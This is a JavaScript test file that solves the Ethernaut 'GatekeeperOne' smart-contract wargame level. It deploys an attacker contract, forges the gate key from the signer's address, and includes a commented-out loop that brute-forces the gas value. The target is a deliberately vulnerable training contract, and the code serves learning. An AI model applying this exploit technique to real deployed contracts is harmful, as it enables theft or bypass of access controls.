const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("GatekeeperOne");
  // Since this challenge is created by the challengeFactory, we cannot tackle the gates one by one.
  const challengeAddress = await createChallenge(`0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 13-GatekeeperOne", async function () {
  const challenge = await getChallenge();
  const factory = await ethers.getContractFactory("GatekeeperOneAttacker");
  const contract = await factory.deploy(await challenge.getAddress());
  await contract.waitForDeployment();

  const [eoa] = await ethers.getSigners();
  const address = await eoa.getAddress();
  const addressLast2Bytes = address.slice(-4)
  const gateKey = `0x123456780000${addressLast2Bytes}`
  // Brute-force the gas locally.
  // const MOD = 8191;
  // const gasToUse = 100000;
  // for(let i = 0; i < MOD; i++) {
  //   console.log(`testing ${gasToUse + i}`)
  //   try {
  //     tx = await contract.attack(gateKey, gasToUse + i);
  //     break;
  //   } catch {}
  // }
  tx = await contract.attack(gateKey, 106739);
  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
